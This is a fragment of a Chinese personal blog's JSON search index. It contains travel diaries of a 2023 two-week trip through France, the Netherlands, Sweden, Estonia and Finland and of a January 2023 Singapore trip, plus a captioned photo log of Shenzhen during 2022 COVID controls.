RDMA。\u003c/p\u003e","title":"使用Mellanox网卡基于RDMA挂载NFS"},{"content":"这篇博客分享笔者于2023年暑假的欧洲旅行，笔者在本次时长两周的旅行中去到了法国、荷兰、瑞典、爱沙尼亚和芬兰。\n路线与景点图 行前准备及杂项 签证 笔者在2月初定下了去欧洲旅行的初步计划，并选择了向法国签证申请。目前在内地申请法签的流程是先在法国政府官网上的预填表系统填表，随后前往tlscontact（法签的外包机构）预约时间。tlscontact上的申请表参考号可以和实际递交的不一样，因此申请时完全可以先写一份表格拿到参考号用来预约，然后快到签证资料递交时间再认真写一份。法签在内地的预约相当紧俏（怀疑是因为预订timeslot并不需要交钱，只需要个人信息和申请表参考号，让黄牛预约并没有任何成本），笔者在2月初尝试在tls上预约，只预约到了4月中的号。\n笔者准备的材料 文件 备注 护照原件 护照复印件（有章/签证的位置与信息页） 所有的复印件都可以用黑白的 申请表打印签名 申请表也可以是黑白的 证件照2张（ICAO格式） 内地身份证复印件 户口本复印件 学生证复印件 在读证明 建议签名（签名的人可以是辅导员导师等普通教授，不一定需要是教务处/注册负责人之类的） 银行结单 近3个月 父母的银行结单 如果户口本在一起就不需要另外的证明材料，如果户口本不在一起的话可能需要出生证证明亲子关系 行程单 机票预定 根据欧盟的《Visa Code Handbook I》第53页（A paid return ticket should not be required upon lodging but may be requested in exceptional circumstances when the visa has been issued. As ticket reservation is often not possible, in such cases the consulate should ascertain that the applicant has sufficient financial means to buy the tickets.），申请申根签证时原则上只需提供机票预订信息，无需付款购买机票。特殊情况下，签证已发放时可能需要提供已支付的返程机票。但需要确认的是，这里的\u0026quot;预订\u0026quot;是指行程信息（Itinerary）还是电子票证（E-ticket）。一般情况下，消费者在未全额付款的情况下无法从OTA或航空公司官网获取电子票证，但某些旅行社可能可以提供未付款的出票服务。笔者当时找到了比较便宜的机票，因此当时直接全款购买了机票，并没有深究这个问题。 酒店预订 可以在booking上定可退的酒店，注意需要把同行人也加入到住客名单里 保险单 可以在支付宝里搜索安联，然后就能找到可用的申根区保险。保险的覆盖时间似乎和签证有效期（允许逗留的天数）有关，如果希望获得一个略长一点逗留天数，保险可以买一个月的。 cover letter 可以请chatgpt写 有关机票预订究竟需不需要付款的问题，笔者也用相应的pdf段落询问了chatgpt，得到的回答如下，供读者参考：\n在这个上下文中，\u0026ldquo;reservation\u0026quot;通常指的是行程信息，也就是航班预订信息。这包括航班日期、时间、出发和目的地等。这样的预订信息可以在未付款的情况下获取，它证明了你有意图在一定的日期和时间进行旅行。\n电子票（E-ticket）则是实际购买机票后，航空公司发出的含有乘客信息、航班信息及付款信息的电子记录，这是完成全额付款后才能获得的。\n所以，申请申根签证时，通常只需要提供航班预订信息，也就是未付款的行程信息，而不是已付款的电子机票。\n机票 笔者去程定了国航直飞的的HKG-PEK-CDG行程，单人约3400元，回程为卡塔尔航空的HEL-DOH-CAN，单人约3300元。某些内地航司的低价机票在google flight上可能是搜不出来的，可以尝试用skyscanner或者携程等OTA搜索，然后在航司官网定。\n如果常住珠三角，也可以多关注内地航司的香港-内地-欧洲的转机票，一般会比只买内地-欧洲这段更便宜（但联程票必须按顺序用，否则无效）。\n欧洲境内的机票直接参考google flight即可，但需要注意欧洲很多航司（不止是廉航）最便宜一档的机票都不带机上行李和托运行李（一般只允许带一个背包），如果有需要可以在订票的时候就买上，会比较便宜。\nflight 酒店 笔者是在booking上按照距离和评分找的，均选择的可以在到店前1-2天免费取消的价格（如果选不可取消的话有些酒店可以提供8折左右的价格）。预订时也可以尝试用一些booking和银行的活动（比如用中国银行的卡在https://booking.com/index.html?aid=1843066上定就有最高5%的折扣，这些活动的链接一般可以在VISA/MASTER/银行的公众号上找到，他们都是根据上面的aid这个parameter标记的）\n景点门票预订 笔者的行程中只有卢浮宫需要提前很久订票（如果需要预约上午比较早的时间需要提前2个月以上预订）。荷兰的博物馆只要提前1个月左右预订即可。瑞典和芬兰的游客可能比较少，景点基本都不需要提前预订门票。\n支付方式 欧洲的信用卡支付非常发达。绝大部分地方都可以信用卡支付（包括一些集市上的摊位），pos机主要收visa/master，收AMEX和银联的机器比较少见。需要注意的是荷兰的某些大型连锁超市（比如Albert Hejin）就只收Mastero和VPay的卡（类似内地只收银联内卡的POS机），没有这些卡就只能付现金了。某些行李寄存处可能也只收现金或需要用硬币。在整个旅程中，笔者大概只花了70EUR的现金，因此携带200EUR现金即可（如果在内地的银行换不到50EUR以下的散钱的话，推荐到达欧洲后用不收取款手续费的卡在ATM上取，因为大部份的店铺不收大面额的欧元）\n电话卡 笔者在淘宝上购买了vodafone.es的卡，65CNY包含10G的EEA流量。实际使用下来网速能保证20Mbps以上，体验还不错。需要注意的是如果买esim建议不要买亚洲提供商（如cmlink/sim2fly等）的esim，这些esim的流量需要绕回亚洲落地，延迟会比较高。笔者之前看到过一个法国orange卖的8G流量/20EUR的esim，但没有实际测试过。\n气候 一般在15-25度之间，如果有太阳只需要穿短袖，阴天/下雨的话可能需要穿一件外套。另外看起来欧洲人不太喜欢在太阳下打伞，打伞的一般都是亚洲人。\nDay 0 香港 - 北京 - 巴黎 hkg 海鲜面，但面是炒面用的面，海鲜则是加了XO酱（和想象中的蕃茄味的海鲜意大利面不太一样） 笔者的去程航班是国航承运的HKG-PEK和CA933 PEK-CDG。为了不那么赶时间，我们特意买了隔夜中转的票，国航也会为这种票送一个「中转酒店」。我们当日分配到的是「北京丰荣君华酒店」，目测大概是200-300CNY一晚的酒店的水准。\npek-t3 PEK T3的人流看起来没有完全恢复，国际航站楼部份只有免税店和肯德基在营业，别的店铺都是关门的状态，有的甚至还被贴上了落款日期是2021年的封条。当日除了一架汉莎的A350之外，廊桥停靠的全部都是CA的777和748。\n出境时可走自助通道，通道前有一位警察询问旅客的到达地。\n当日我们乘坐的777是国航2016年左右引进的3-4-3经济舱的77W（座位图） ，整架飞机基本满座。\n机舱 经过亚欧分界线附近 第一餐，鸡肉饭 第二餐，还是鸡肉饭，甜品是咖啡冻，味道很怪 波罗的海上的风力发电机 飞机（CDG拍摄） 带中文标识的CDG 交通卡 到达巴黎后，笔者先参考这篇文章去T2的RER站（可以在车站的站厅最下面一层又一个很多人排队的售票处购买，具体位置参考前面的文章）买了一张navigo周卡。Navigo 1-5区（一般大家都是买这个版本，因为这样周卡就能包括机场和凡尔赛宫）的周卡收费35EUR（包括5元行政费），仅能在购买时的自然周使用。由于CDG进城的RER铁路就要收费10EUR左右，所以如果在巴黎的时间正好位于一个自然周内，而且需要坐机场的RER B的话，买周卡应该是比较划算的。具体的车站在哪个zone可以参考RATP的地图。\n在巴黎乘坐RER时可以考虑用citymapper导航，它能够看到RER的不同交路具体在的站台，在坐RER C这种交路很复杂的线路时会比较有用。\n博物馆通票 可以考虑在网站上购买48或72小时的通票（PMP），如果看的博物馆超过3-4个应该就可以把通票的钱值回来了。\nDay 1 圣母院，凡尔赛宫，铁塔 第一天上午笔者先去西堤岛上逛了一下，去看了因火灾关闭还在重建的圣母院和Sainte-Chapelle教堂。\n修复中的圣母院 游船和河边建筑 电动车充电站 随后乘RER C去了凡尔赛宫。\nRER C，不同交路有一个四个字母的缩写用于分辨，市中心去凡尔赛宫的车一般只有VICK 凡尔赛宫 凡尔赛宫 壁画和水晶吊灯 后花园 郊外的平房和楼房 埃菲尔铁塔 由于当日电梯票卖完了，爬楼梯太累，笔者就仅在塔下观看了一下。（进到塔的下方需要安检，但并不需要收费）\n出口标准（Sortie是法语的「出口」） 铁塔 铁塔 从塔底看 铁塔周围的小贩，主要卖的产品就是金属的铁塔模型和各种挂件 地铁Saint-Augustin站，巴黎的地铁站距较短，并践行了「小编组高密度」 晚上8点的天空，依然很亮 Day 2 奥赛博物馆，巴黎航展，凯旋门 奥赛博物馆 奥赛博物馆，改建自火车站 莫奈的poppies（花田） 巴黎航展 航展的举办地点在郊外的Paris Airport-Le Bourget机场，这个机场平时不飞普通客运航班，主要为公务机使用。\n空客饮水机 中航工业的战机 A400M 协和超音速客机 土耳其教练机，空中可以看到一架台风战斗机和一架螺旋桨飞机表演 巴航工业的运输机 利雅得航空和波音展馆 USAF的一代喷气式飞机 KC767 F35 凯旋门 凯旋门外观 香榭丽舍大道 凯旋门上看到的埃菲尔铁塔 Bouillon Pigalle 当日的午餐笔者去了Bouillon Pigalle吃，算是一家平价的法餐餐厅（可能类似于外婆家之于内地的地位）。我们点了图中的四个菜加上一盘蜗牛，一共花了约55EUR。这家餐厅比较热门，可以用google地图里的链接提前2-3天左右定位，不然就需要在外面排队了。\nBouillon-Pigalle 这家店也提供，笔者吃起来觉得他跟螺的味道类似。\n法式蜗牛 Day 3 蒙马特高地，卢浮宫，蓬皮杜中心 圣心大教堂 上山包有一个缆车可以坐（距离很短，大概1分钟就到了），可以刷navigo的卡 卢浮宫 如果不想晒太阳的话，可以考虑从Palais Royal - Musée du Louvre地铁站直接出到地下商场，然后进入卢浮宫的地下大厅，这样可以避免在室外排队。\n中文和英文的导览图似乎非常抢手，如果被拿完了的话可以在网上下载英文版或中文版的PDF地图。\n地下大厅的倒金字塔 地面的金字塔入口 《蒙娜丽莎》，如果需要近看画需要拍很久的队，笔者这张图拍的是队伍的出口 卢浮宫外的LV广告 蓬皮杜中心 因为此时我们的PMP通票已经过期了，笔者仅在外面看了一圈。\n蓬皮杜中心 RATP运营的有桩单车，也可以刷navigo Day 4 巴黎 - 阿姆斯特丹 我们乘坐的是Thalys（即将和欧洲之星合并）的高铁从 Paris Nord 前往Amsterdam Centraal。Thalys的起始站位于巴黎北站，这边的配置是若干个港湾式月台，乘客从铁路的末端上车。车站里除了去比利时、荷兰的Thalys之外还有去英国的Eurostar、法国国内和去瑞士的TGV，以及巴黎近郊的通勤车和慢车。巴黎北和内地不同的是车站没有任何候车用的椅子，也没有闸机验票，因此一般在开车前10-20分钟抵达车站就来得及上车了（来得更早也没有座位坐）。有关乘车体验和车上设施也可以参考seat61的文章。\nthalys的车头，整车的涂装是红色 月台，进站台之前会有职员扫二维码检票 Thalys用的车底似乎都是动集，内部的二等座是2+2的布局（类似于内地高铁一等座的布局了），乘坐起来相比内地车厢的摇晃要更厉害一些。\nAmsterdam Central站，荷铁的车和内地一样都是统一涂装 NS二等座内景，远处是奥地利国铁OBB的二等座车 运河上的游船 Wok King 当天的晚饭是在一家兰州拉面馆Wok King吃的。一份拉面+小菜+茶叶蛋的价格约15EUR，味道还算正宗。\nWok King 欧洲的塑料瓶/铝罐回收机 多个欧盟国家（包括荷兰）都自一两年前开始为瓶子征收了押金（一般介于0.15EUR-0.5EUR之间），如果要退回瓶子的押金，在喝完水之后就需要把瓶子送到超市的回收机内。回收完成后，回收机会打出一张价格和押金一致的优惠券，相应的优惠券可以在超市用掉。\n回收机，正常情况应该把瓶子从被defect盖住的那个洞丢进去 Day 5 梵高博物馆，赞单（Zaadam） 梵高博物馆 一般各种攻略上都会推荐大家去梵高博物馆和荷兰国立博物馆Rijksmuseum。但因为时间有限我们就去了梵高博物馆，Rijksmuseum就算不买票也可以去宫外的草坪转一转。\nZaandam OVPAY 目前荷兰的国铁和大部份的公共交通（地铁电车巴士等）都接入了ovpay，它的运作方式和内地公交上的银联云闪付差不多，只要在出入闸机的时候刷visa/master卡就能自动结算行程了。荷兰的国铁大站进闸都有闸机，小站和阿姆斯特丹机场站则需要在站台上的check-in和check-out柱子上刷卡来记录进站和出站信息。公交和国铁的导航都可以通过citymapper或者google maps来规划（说到这个apple maps在内地现在也能接入高铁和国铁进行公共交通导航了）。\n去赞单的话如果精力比较充足的话可以在NS Zaandam站下车，然后一直沿着河边走到风车村，最后从Zaandijk Zaanse Schans返回。中间除了乐高小镇附近的步行街之外，还能看到一些居民区的平房。\n居民区 快走到风车村附近的居民区 风车特写 如果不想走路的话也可以考虑在看完乐高小镇之后直接坐国铁到Zaandijk Zaanse Schans站。Zaandijk Zaanse Schans是一个小站，入站后在站台上的check-in桩上刷卡即可。\nNS Sprinter Day 6 鹿特丹，代尔夫特，海牙 本日的行程笔者参考了The Hague海牙、Delft台夫特一日遊这篇文章。\nRotterdam 笔者早上先用NS坐到了Rotterdam Blaak（需要注意如果坐的是IC direct直达车，需要在站台上再刷一次附加费1.7EUR左右），随后在cube house和鹿特丹的集市转了一下，顺便也解决了午饭。\nRotterdam Blaak旁边有一个比较大的机库形建筑，在没有集市的日子里里面也有很多吃的（类似美食广场）。\nGrotemarkt Delft NS Delft站是一个地下站 笔者参考了上述文章的地图，在NS Delft站下车，在城区转一圈即可。\nThe Hague 在海牙可以在Den Haag Centraal站下车，然后在市中心转一转后乘电车去和平宫（国际法院）外面看一下，最后再坐电车去海滩边。\n和平宫 海滩边，有大量的海鸥 回程NS上的窗外风景，和禁止抛物的标志 Restruant Lavash 当天晚上回到了阿姆斯特丹吃了Restruant Lavash，点了两个意面和一些小吃，一共55EUR。\nRestruant Lavash Day 7 阿姆斯特丹 - 斯德哥尔摩 The Pantry 当日中午笔者去吃了The Pantry，一家比较典型的荷兰菜餐厅，建议在google maps上提前订位。菜的味道较为清淡，鲈鱼和土豆泥做的还不错，土豆泥焗牛肉里的牛肉没有味道，可能主观感受比较奇怪。\nMenu 4 中的土豆泥鲈鱼，土豆泥焗牛肉 AMS-ARN 当日下午笔者的行程是乘飞机飞往斯德哥尔摩。申根区境内的航班对证件查验管的较松，如果不托运行李，全程都没有需要检查乘机人证件的地方，只用电子登机牌就可以入闸和登机了。\n许多KLM客机 飞机上的日落 到达斯德哥尔摩ARN机场后，如果觉得铁路太贵的话可以考虑买flybussarna的机场大巴票或者flixbus，价格都比火车便宜了一半左右。\nDay 8 诺贝尔博物馆，瑞典皇宫，照片博物馆（Fotografiska） Restaurant Kajsas Fisk 本日中午我们的午饭是Restaurant Kajsas Fisk一家（似乎是亚洲人开的）主要做鱼汤的店。招牌就是三文鱼汤和面包。味道有点类似于罗宋汤，三个人吃花了大约450SEK。\n鱼汤和面包 Stockholm Central Station 车站大堂 SJ的车头 CRH1的瑞典原形 斯德哥尔摩地铁站台 公交轮渡 瑞典皇宫 由于之前已经在法国看了挺多欧洲中世纪到近现代的展品了，北欧的皇宫我们就都没有进去参观，只是在外面观赏了一下。\n皇宫侧面的卫兵换岗 诺贝尔博物馆 博物馆里主要是展出一些和诺贝尔奖获奖者所获奖项有关的装置，或者是激发他们的灵感的生活日常用品。\nFotografiska Fotografiska是一个摄影展馆，其内容倒是和瑞典关系不太大，一般是国际上一些知名摄影师的轮展（具体展出的内容可以在官网上查询），它也在世界各地有其他的分馆。\nFotografiska外观，前面左侧的建筑 Fotografiska的游船 Fotografiska还提供接载参观者的游船从海峡另一侧和市中心接人去展览馆，但只在上午运行。\nSkinnarviksparken⁩ 可以在这个位置看到一部份斯德哥尔摩的老城，在日落时的景色也不错。\n日落 Day 9 Skansen，斯德哥尔摩 - 塔林轮渡 Skansen Skansen有点类似于深圳的锦绣中华，展出的主要是瑞典的一些传统文化和传统民俗。里面有复古的村落，教堂，然后另一侧是一个农庄风格的动物园。\n复古建筑 农庄 Skansen北部的Djurgårdsbrunnsviken（算是一个湖） 斯德哥尔摩-塔林 轮渡 斯德哥尔摩-塔林-赫尔辛基之间一般有三家轮渡公司运营（分别是Viking Line，Tallink和Eckerö Line，其中斯德哥尔摩-塔林和斯德哥尔摩-赫尔辛基是过夜航线（买票的时候会要求选房间等级），塔林-赫尔辛基是3小时左右的普通航线（不分配座位，但可以在餐厅和休息区的任何地方随便坐）。\n轮渡公司在这些航线上一般都会配备大约3-6万吨级的大型滚装船，所以乘坐起来基本不会感觉到晕船。船上有餐厅，超市，免税店，酒吧等各种娱乐设施，航程中一般也不会太无聊。\n轮渡票 如果希望在预订时订到比较优惠的票价的话，可以考虑用出发国和到达国的本地语言网站（如爱沙尼亚，瑞典，芬兰）搜索一下，也许会有优惠码。\n滚装轮渡，是从船头上下车的 轮渡两人间，有独立卫浴（在照片的右边） 酒吧 轮渡一侧的景色，当晚一直在下雨，因此也只能看到比较近的海 Day 10 塔林老城，海事博物馆（Lennusadam） 塔林港 卡车下船 不同的轮渡公司的船在塔林码头的terminal是不一样的，如Viking Line在A，Tallink在D码头。\n塔林港的标牌，第三语言甚至还是中文 塔林老城 对于搭邮轮上午到达塔林，傍晚离开的游客来说，一般大家的主要旅游景点就是塔林老城了。老城主要包括了13世纪左右开始建设的一些教堂，城墙和市政厅等。\n从Kohtuotsa vaateplats（一个观景台）看到的老城和远处的新建筑 Alexander Nevsky Cathedral Freedom Square上的小型演唱会 塔林电车 Lennusadam 博物馆外 Lennusadam是塔林的海事博物馆（曾经似乎是苏联用的潜艇船坞），里面的主要展品是一艘潜艇和一些退役的船只，潜艇可以进去看，旁边还有一个游船码头。\n爱沙尼亚的古沉船 潜艇（EML Lembit）外部 潜艇内部 游船码头 退役的巡防舰 Tallinna Linnahall Linnahall是1980年苏联奥运会时建设的「第六列宁文化体育宫」，用于当年举办帆船比赛时的接待工作。整个建筑的外立面都是纯混凝土，没有任何装饰。这座建筑也在拍摄《信条》电影的时候被装饰成了基辅歌剧院，用来拍开场的片段。\n轮渡码头 入口，但已经被封上了 广场平台 塔林-赫尔辛基轮渡 Viking XPRS Viking Line长期将Viking XPRS运用在塔林往返赫尔辛基的轮渡航线上。这艘船的客舱较少，登船之后也不会分配座位，乘客可以随意坐在船上的餐厅和酒吧的位置。船上同样也有免税店和超市，途中也见到很多芬兰人会买大量的酒带下船（似乎原因是芬兰酒类的消费税高于爱沙尼亚）。\n船尾的露天座位 海面 Helsinki Lighthouse，大概处于刚刚进入芬兰领海的位置 赫尔辛基海关，申报和非申报通道（不过看起来只是走个形式，也没有任何人在值班） Day 11 赫尔辛基市区，芬兰岛 赫尔辛基公共交通 赫尔辛基的交通票和巴黎类似，单程票是分区，限时的。但芬兰的铁路没有闸机，买票后也不需要验票。购票可以用当局的官方的HSL App买票，可以绑定信用卡扣款。上大巴时给司机看，上火车的时候如果遇到查票时出示就可以了。\n宇通公交车 芬兰堡 Suomenlinna Suomenlinna是赫尔辛基南部的一个岛，上面是有一些18世纪左右开始建设的堡垒遗址，但如今也有居民居住，和厦门之于鼓浪屿的关系类似。有趣的是，Suomenlinna在芬兰语里是「芬兰堡」，在瑞典语中的意思是「瑞典堡（Sveaborg）」。\n去芬兰岛可以在Market Square坐HSL运营的船，持有A区的票即可。\n在轮渡上远看viking line 和轮渡一起飞的海鸥 岛上未注水的船坞 加拿大鹅和远处的城墙 炮台 海边 如果不想走回头路的话，回程可以在Kings Gate坐FRS Finland的船回去，票价大约5EUR。\nFRS Finland Market Square 回到码头后码头旁边的一堆摊位就是Market Square。这里有一些餐饮和纪念品店。\nThe Stone of The Empress 如果想吃饭也可以到旁边的Alko Helsinki Wanha Kauppahalli里吃，这里算是一个小型的美食广场。我们当时在北侧的一个鱼汤店里点了鱼汤和一些沙拉，大约花了55EUR的样子。\n鱼汤沙拉和炸鱼（但炸鱼味道一般） 下午笔者的余下行程是在赫尔辛基的市区转了转，并且参观了国立博物馆和圆顶教堂（Temppeliaukion Church）。\n晚上利用酒店的烤箱做了一个烤三文鱼块配意大利面。配料如下：\n三文鱼块（买的超市切好的，大概9EUR） 灯笼椒 番茄 洋葱 胡椒粉，柠檬（汁） 最后腌制一下放在烤箱里烤就可以上桌了。\n烤三文鱼意面，图中上面的饮料是可乐 Day 12 阿尔托大学，坦佩雷 阿尔托大学 图书馆 通道外的涂鸦 不知道是干什么用的aalto学生会的车 湖边 Aalto的Metro Block，前景的M是地铁站 在食堂吃的午餐，左边的酱汁是某种炖鸡肉，味道比较奇怪 坦佩雷 当天下午我们乘芬兰国铁VR从Helsinki Central去坦佩雷转了一圈，VR快车的往返票大约30EUR/人。\n谭佩雷的海边 超市看到的芬兰杂志 芬兰人似乎不太吃三文鱼和其他鱼类的骨头和碎肉，1kg的骨头和碎肉在超市里只要1.5EUR，比较适合买回去做汤（但芬兰的豆腐比较贵，100g的豆腐可能也要2EUR，因此做汤时可以考虑用土豆替换豆腐）。\nDay 13 芬兰 - 多哈 - 广州 HSL的通勤火车内部 机场入口 在热水部份专门写了中文提示的饮水机 机场的银联广告，这个破旧程度怀疑是covid之前就贴上了 HEL-DOH的飞机上发了一餐正餐，一餐小面包。其中正餐是燕麦番茄鸡肉饭配冷的意大利螺丝粉。鸡肉味道还不错，但燕麦饭比较硬，有点难以下咽；冷的意大利螺丝粉有一股奶酪味，笔者觉得还好，但同行的朋友表示不太能接受。\n芬航航食 要饮料的时候可以试试AY的特色蓝莓汁，和这个名叫Northern Blush的鸡尾酒（味道大概就是果酒的味道，但目前似乎只有飞机上才能喝到） 厕所内的中文标识，用了隶书的字体 机舱环境，AY的A330在2021年左右进行过翻新，因此内饰和近期新交付的A350也差不多，屏幕大且流畅，还有分辨率可用的卫星图看 飞机上的日落，此时大概飞到了土耳其一带 DOH 多哈机场里的熊，似乎每隔一段时间会给他换个衣服 类似星耀樟宜的花园 DOH-CAN 飞机的IFE，行程显示页面只有一个视频看，没法自己调整 QR的航班上发了2次餐食，一次brunch（按照广州时间来说算早餐），一次午餐。机舱的座椅前后间距比较小（77N布局，笔者感觉甚至不如内地的一些窄体机的间距），坐下之后拿放在脚边的包都有些困难。\n起飞之后很快发了早餐（应该是按照广州时间），早餐的主食是西式的番茄酱炒蛋和香肠，上面那盒红色的是草莓味酸奶，非常甜。\n早餐，鸡蛋香肠 快降落时发了午餐，午餐是味增牛肉，上面的依然是芒果味酸奶，右边的是某种阿拉伯沙拉，里面有白萝卜，红萝卜和豆子，但并不是太好吃\u0026hellip;\n午餐，味增牛肉 白云区 到达广州 回程入境时打了指纹的护照可以走自助通道，但通道前有一位警察询问旅客的始发地。\nEND\n","permalink":"https://blog.sparktour.me/posts/2023/08/01/2023-summer-europe-travel-notes/","summary":"\u003cp\u003e这篇博客分享笔者于2023年暑假的欧洲旅行，笔者在本次时长两周的旅行中去到了法国、荷兰、瑞典、爱沙尼亚和芬兰。\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2023/2023-summer-europe-travel-notes/IMG_3236_eiffel_from_adt.jpeg\" alt=\"\"  /\u003e\n    \u003cfigcaption\u003e\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch1 id=\"路线与景点图\"\u003e路线与景点图\u003c/h1\u003e\n\u003ciframe src=\"https://www.google.com/maps/d/embed?mid=1hOXlF9I5yd5HyXJqyBniku_j_aI0cEg\u0026ehbc=2E312F\" width=\"100%\" height=\"480\"\u003e\u003c/iframe\u003e\n\u003ch1 id=\"行前准备及杂项\"\u003e行前准备及杂项\u003c/h1\u003e\n\u003ch2 id=\"签证\"\u003e签证\u003c/h2\u003e\n\u003cp\u003e笔者在2月初定下了去欧洲旅行的初步计划，并选择了向法国签证申请。目前在内地申请法签的流程是先在法国政府官网上的\u003ca href=\"https://france-visas.gouv.fr/en/web/france-visas/online-application\"\u003e预填表系统\u003c/a\u003e填表，随后前往\u003ca href=\"https://visas-fr.tlscontact.com/\"\u003etlscontact（法签的外包机构）\u003c/a\u003e预约时间。tlscontact上的申请表参考号可以和实际递交的不一样，因此申请时完全可以先写一份表格拿到参考号用来预约，然后快到签证资料递交时间再认真写一份。法签在内地的预约相当紧俏（怀疑是因为预订timeslot并不需要交钱，只需要个人信息和申请表参考号，让黄牛预约并没有任何成本），笔者在2月初尝试在tls上预约，只预约到了4月中的号。\u003c/p\u003e","title":"进入欧盟口岸区——2023欧洲之旅"},{"content":" 飞机降落时拍到的新加坡海岸线 随着中国内地最终「与病毒共存」并于1月8日不再要求入境人士进行隔离，笔者也与朋友于1月末前往新加坡旅行了大约一周。以下则是笔者对这一周行程的流水账记录。\n行前准备及杂项 机票 由于中国内地开放时间较短，新加坡飞往中国内地的航班价格仍然较高。因此，笔者决定预订香港往返新加坡的航班，总价约为每人2300港币。目前，新加坡航空在新加坡和香港之间每天运营三班航班，分别使用B777、A350和A380型号的飞机。读者可以根据自己的喜好选择乘坐的飞机型号。\n酒店 我们于Agoda上提前大约20天预订了Hotel Boss最基础的双人间，房间大小约15m2（摆了床之及摊开行李箱后就会变得比较局促），总价约3700HKD。\n景点门票预订 以下是笔者在新加坡所去的景点（大学）等的地图：\n在新加坡旅游时，预订酒店时可以考虑比较携程和景点官网的价格。通常情况下，如果提前7天以上订酒店，携程的价格会比景点官网低大约8-9折。不过，需要注意的是，新加坡的大部分景点的门票需要指定日期，并且无法退票。因此，在预订酒店时需要谨慎确认自己的行程，以确保在购买门票时能够选择正确的日期。\n支付方式 新加坡的信用卡支付非常发达。除了一些小店之外，大多数商店、餐厅（包括熟食中心的商家）都支持Visa/Master非接触式信用卡付款。此外，公共交通系统如地铁和公交车也支持直接刷卡搭乘（类似银联闪付），但每天晚上会统一扣款。在我们的旅程中，我们只使用了大约50新元的现金。\n电话卡 支持esim的手机可以考虑使用中国移动国际提供的CmLink数据卡，7天/5GB数据的价格大概只要60CNY不到，但获取到的是香港ip。也可以在出机场后的TravelX柜台（T3出口）或者网上提前订购Singtel的游客卡（也需要去柜台取），14天/100G的套餐售价12SGD。\n气候 新加坡的冬季气候大约相当于中国南方5-6月的气温，穿短袖和长裤就可以了。然而，由于新加坡位于热带地区，每天午后通常都会下一场雨。此事以选择在地铁或者室内景点等地避开这段时间。\nDay0 飞机上 香港机场的天际走廊上所见的国泰777 飞机降落时拍到的新加坡海岸线 机场边检，设计非常现代 酒店房间 Day1 第一日的行程主要是新加坡地标鱼尾狮雕像，克拉码头，滨海湾花园及Night Safari夜间野生动物园。\n著名的鱼尾狮喷泉 金融区的大厦 新加坡议会大厦 克拉码头，本质上是一条酒吧街，白天去的话没啥人 中午我们前往了市中心的一个大熟食中心Lau Pa Sat吃午饭。在新加坡，熟食中心基本就是香港和内地常说的“美食广场”。\nLau Pa Sat 本日中午笔者尝试了新加坡版本的海南鸡，和香港（粤菜）海南鸡的区别是新加坡的海南鸡不带皮，并且饭也像港式海南鸡那样是黄色的（不过应该都是用鸡油煮的，味道类似）。\n新加坡海南鸡饭 滨海海湾花园中的室内植物园 花园内的步道 花园内的瀑布 滨海湾花园的“钢结构树”与金沙酒店 晚上笔者则游览了夜间野生动物园Night Safari，该动物园的特别之处即是仅在夜间开放，游客也是在接近满月月光的环境下参观整个动物园。不过由于光线较暗导致难以看清园内的动物，互联网上对动物园的评价也褒贬不一。\nNight Safari 喂河马 在晚间新加坡地铁没有广告可播的时候，列车PIDS的广告屏幕会换成新加坡国旗🇸🇬 酒店旁的便利店仍在售卖连花清瘟胶囊，售价10SGD Day2 第二日的行程主要为新加坡的两间大学——新国立和南洋理工大学，及新柔长堤。\nNUS靠近附属医院一侧的入口 NUS的工学院大楼 NTU侧门 NTU的著名建筑“蒸笼”——The HIVE NTU花园中旧南洋大学（后被并入NUS）的牌坊 兀兰地铁站 兀兰地铁站，该站建的非常宽敞，相信是为未来新山－新加坡捷运系统的客流做了预留 新柔长堤（左侧）和马来西亚新山 Day3 第三日的行程主要为环球影城。新加坡的环球影城位于圣淘沙岛上，但占地面积非常小，甚至小于香港迪士尼。\n环球影城入口的标志 进门即可看到的好莱坞大道 变形金刚大黄蜂模型与过山车 晚上笔者则去尝试了松发肉骨茶，笔者的朋友肉骨茶（可以理解为一种排骨汤）的评价是“猪肚鸡的味道”，也许是松发在汤里加了太多的胡椒😂。\n松发肉骨茶 Day4 第四日的行程主要为国家美术馆和新加坡空军博物馆。（很明显能看出笔者和朋友已经想不到去哪里玩了😂）\n国家美术馆 空军博物馆外展示的E2预警机 空军博物馆内展示的一些战斗机机体 Day5 返程 星耀樟宜中标志性的瀑布，可惜因为笔者来机场太早，瀑布还没打开 从新加坡起飞时拍到的新加坡东部 降落时拍到的港珠澳大桥，可惜香港当日的能见度并不是太好 ","permalink":"https://blog.sparktour.me/posts/2023/02/01/2023-winter-singapore-travel-notes/","summary":"\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2023/2023-winter-singapore-travel-notes/d0-SIN-coast.jpg\" alt=\"飞机降落时拍到的新加坡海岸线\"  /\u003e\n    \u003cfigcaption\u003e飞机降落时拍到的新加坡海岸线\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003e随着中国内地最终「与病毒共存」并于1月8日不再要求入境人士进行隔离，笔者也与朋友于1月末前往新加坡旅行了大约一周。以下则是笔者对这一周行程的流水账记录。\u003c/p\u003e","title":"国际亚洲都会——新加坡之旅"},{"content":"所有照片按照时间排列。由于嫌麻烦，照片都没有做过任何后期处理，权当是记录一下我的2022吧。\n2022年12月，共存后被拆除的核酸采样点 1月，学校的隔离宿舍 1月，沿红树林出海口向南望 2月，地铁6号线上看到的深圳北站日落 3月，深圳封城时社区发的「大礼包」，内容是若干个苹果和饼干 3月，印着和广播着「快来做核酸」的宣传车 3月，盐田的海面上被拉上了黄色的围栏，据说是为了防止香港偷渡。 4月，一名外卖员站在被封控居民楼的围墙外 5月，倒闭的邦德教育（深圳一家本土义务教育阶段培训机构）某校区 5月，南科大中心的傍晚 6月，从大南山上向南望，可以看到南山区，青山发电厂和香港机场 6月，深圳湾公园的探照灯，用于夜间搜索偷渡者 7月，从福田向南望香港新界的山丘 7月，南科大的毕业典礼 8月，厦门机场旁的一处城中村 8月，宝能城核酸点 8月，市民中心内部供工作人员使用的核酸点 8月，深圳湾口岸 11月，高交会山一家展销「电子哨兵」的商家 12月，共存后被拆除的核酸采样点 12月，澳门新葡京 